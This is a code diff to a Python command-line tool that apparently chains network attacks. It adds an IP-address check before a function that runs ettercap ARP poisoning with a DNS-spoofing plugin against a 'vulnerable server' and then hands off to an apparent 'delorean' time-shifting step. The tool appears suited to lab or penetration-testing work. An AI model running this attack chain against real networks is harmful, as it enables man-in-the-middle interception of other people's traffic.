@@ -10,6 +10,7 @@ from datetime import datetime
 from termcolor import colored
 from pyfiglet import Figlet
 from dependencies import checkErrors
+from utility import is_valid_ip_address
 
 console = Console()
 app = typer.Typer()
@@ -37,20 +38,23 @@ def get_timestamp():
 def ettercap(timestamp, server, username, password):
     ip = input("Enter the IP address of the vulnerable server: ")
     #ip = "192.168.43.131"
-    cmd = "sudo ettercap -T -M arp /" + ip + "// -P dns_spoof"
-    print("Ettercap Starting...")
-    p = pexpect.spawn(cmd, timeout=None)
+    if not is_valid_ip_address(ip):
+        console.log(f"[red bold]Error:[/red bold] Ip addres is not valid")
+    else:
+        cmd = "sudo ettercap -T -M arp /" + ip + "// -P dns_spoof"
+        print("Ettercap Starting...")
+        p = pexpect.spawn(cmd, timeout=None)
 
-    if not p.eof():
-        console.print("Ettercap Started!", style="bold green")
-        print("DNS Spoofing Starting...")
+        if not p.eof():
+            console.print("Ettercap Started!", style="bold green")
+            print("DNS Spoofing Starting...")
 
-    while not p.eof():
-        str_line = str(p.readline())
-        if "UDP  " + ip + ":" in str_line:
-            console.print("DNS Spoofing Started!", style="bold green")
-            delorean(timestamp, server, username, password)
-            break
+        while not p.eof():
+            str_line = str(p.readline())
+            if "UDP  " + ip + ":" in str_line:
+                console.print("DNS Spoofing Started!", style="bold green")
+                delorean(timestamp, server, username, password)
+                break
 
 
 def delorean(timestamp, server, username, password):
